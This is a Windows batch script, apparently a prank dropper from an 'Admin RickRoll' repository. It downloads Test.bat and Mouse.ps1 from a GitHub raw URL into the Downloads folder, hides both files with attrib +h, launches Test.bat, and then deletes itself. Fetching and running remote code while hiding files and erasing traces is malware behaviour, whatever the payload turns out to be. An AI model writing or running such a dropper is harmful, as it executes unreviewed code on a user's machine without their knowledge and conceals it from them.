@echo on
cd C:%homepath%\Downloads
Powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Admin RickRoll/Test.bat' -OutFile .\Test.bat
Powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Admin RickRoll/Mouse.ps1' -OutFile .\Mouse.ps1
attrib +h Test.bat
attrib +h mouse.ps1
powershell start .\Test.bat 
cd /D "%~dp0"
del Big.bat
exit
